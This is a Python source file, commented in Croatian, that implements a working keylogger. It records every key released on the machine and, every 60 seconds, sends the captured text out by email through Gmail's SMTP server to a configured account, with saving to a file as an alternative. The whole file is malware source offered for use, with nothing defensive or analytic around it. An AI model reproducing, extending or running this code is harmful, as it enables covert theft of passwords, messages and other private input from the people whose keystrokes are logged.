import keyboard # za keylogove
import smtplib # za slanje emaila korištenjem SMTP protokola (gmail)
# Timer za pokretanje metoda nakon određenog vremena
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 60 # u sekundama, 60 znači 1 minuta itd
EMAIL_ADDRESS = "adresa"
EMAIL_PASSWORD = "lozinka"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # interval
        self.interval = interval
        self.report_method = report_method
        # ovo je string koji sadrži sve logove
        self.log = ""
        # početak i kraj vremena bilježenja
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        Ovaj callback se poziva kada se dogodi neki keyboard event
        (npr. kada se otpusti tipka)
        """
        name = event.name
        if len(name) > 1:
            # nije slovo, broj ili specialni znak (ctrl, alt, itd.)
            # uppercase s []
            if name == "space":
                # " " umjesto "space"
                name = " "
            elif name == "enter":
                # dodavanje nove linije kad se pritisne ENTER
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # zamjena razmaka s donjom crticom
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # na kraju dodajemo name u  "self.log" varijablu
        self.log += name


    def update_filename(self):
        # ime datoteke da bude kombinacija početka logova i kraja
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """Ova metoda pravi log datoteku u trenutnom direktoriju koja
           sadrži trenutne logove u self.log varijabli"""
        # otvara datoteku u write modu
        with open(f"{self.filename}.txt", "w") as f:
            # zapisuje logove u datoteku
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")


    def sendmail(self, email, password, message):
        # uspostavlja vezu sa SMTP serverom
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # za sigurnost se spajamo preko tls-a
        server.starttls()
        # login
        server.login(email, password)
        # slanje poruke
        server.sendmail(email, email, message.encode('utf-8'))
        # završava sesiju
        server.quit()

    def report(self):
        """
        Ova funkcija se poziva svaki interval "self.interval"
        Ona šalje logove i resetira self.log varijablu
        """
        if self.log:
            # ako ima nešto u logu, obavijesti
            self.end_dt = datetime.now()
            # updejtanje `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # za pritanje u konzolu izbrisati sljedeću liniju
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # postavljanje dretve kao daemon (gasi se kad i glavna dretva)
        timer.daemon = True
        # pokretanje tajmera
        timer.start()

    def start(self):
        # bilježi vrijeme pokreatanja
        self.start_dt = datetime.now()
        # pokretanje keyloggera
        keyboard.on_release(callback=self.callback)
        # bilježi pritisnute tipke
        self.report()
        # blokiranje trenutne dretve, čeka dok se ne pritisne CTRL+C
        keyboard.wait()

if __name__ == "__main__":
    # za slanje na mail
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # za spremanje u datoteku
    #keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()